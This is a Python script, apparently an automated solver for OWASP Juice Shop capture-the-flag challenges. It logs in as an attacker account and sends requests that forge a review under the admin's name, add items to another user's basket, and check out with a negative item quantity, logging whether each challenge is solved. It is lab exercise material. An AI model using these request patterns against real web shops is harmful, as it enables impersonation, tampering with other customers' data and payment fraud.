import harness
from harness import Session, log_attempt, solved_set
s = Session()
def solved(k): return k in solved_set(s)
def L(key,name,approach,detail=""):
    ok=solved(key); return log_attempt(key,name,approach,("success" if ok else "failed"),ok,detail)

ATT="attacker_ctf@evil.io"; PW="Attacker1!"
auth = s.post("/rest/user/login", auth=False, json={"email":ATT,"password":PW}).json()["authentication"]
s.token = auth["token"]; mybid = auth["bid"]
print("my bid =", mybid)

# Forged Review (PUT)
r = s.put("/rest/products/1/reviews", json={"message":"forged review!","author":"admin@juice-sh.op"})
L("forgedReviewChallenge","Forged Review","PUT /rest/products/1/reviews author=admin@juice-sh.op (author not validated against session)", f"{r.status_code} {r.text[:60]}")

# Basket Manipulate — POST item to a basket that isn't mine
target = 1 if mybid != 1 else 2
r = s.post("/api/BasketItems", json={"ProductId":1,"BasketId":target,"quantity":1})
L("basketManipulateChallenge","Manipulate Basket",f"POST /api/BasketItems BasketId={target} != my bid {mybid} (IDOR/mass-assign)", f"{r.status_code} {r.text[:80]}")

# Negative Order — add item to MY basket, set negative qty, checkout
r1 = s.post("/api/BasketItems", json={"ProductId":6,"BasketId":mybid,"quantity":1})
try:
    iid = r1.json()["data"]["id"]
    r2 = s.put(f"/api/BasketItems/{iid}", json={"quantity":-50})
    det=f"item {iid} qty->-50 ({r2.status_code})"
except Exception as e:
    det=f"add failed {r1.status_code} {r1.text[:60]}"
r = s.post(f"/rest/basket/{mybid}/checkout")
L("negativeOrderChallenge","Payback Time",f"Set basket item to negative quantity, checkout basket {mybid} -> negative total", f"{det}; checkout {r.status_code}")
